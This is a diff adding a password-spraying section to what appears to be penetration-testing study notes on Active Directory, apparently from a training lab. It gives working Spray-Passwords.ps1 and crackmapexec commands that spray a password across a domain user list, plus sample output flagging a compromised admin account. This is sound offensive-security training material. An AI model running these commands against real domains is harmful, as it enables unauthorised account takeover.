@@ -704,6 +704,46 @@ Automating of enumeration in AD can be done by bloodhound and sharphound.
 crackmapexec smb (ip) -u "" -p ""
 ```
 
+## Password Attacks in active Directory
+
+With the password spray attack we can see if a password is used by any other user in the domain or not.
+
+We can do it with a tool called spraypassword.ps1
+
+```shell
+.\Spray-Passwords.ps1 -Pass Nexus123! -Admin
+```
+
+This will check if the password 'Nexus123!' is used by any other user or not.
+
+We can also use crackpaexec for the password spray attack.
+
+```shell
+crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
+```
+
+With crackmapexec we can also check if that user is a domain admin or not.
+
+```shell
+crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com
+```
+
+If it will be domain admin there will be written pwaned in the output like this.
+
+```shell
+SMB         192.168.50.75   445    CLIENT75         [*] Windows 10.0 Build 22000 x64 (name:CLIENT75) (domain:corp.com) (signing:False) (SMBv1:False)
+SMB         192.168.50.75   445    CLIENT75         [+] corp.com\dave:Flowers1 (Pwn3d!)
+
+```
+
+
+
+
+
+
+
+
+
 ## AS-REP Roasting
 
 This is related to how kerberos works, in active directory all the users are setup to require pre-authentication.
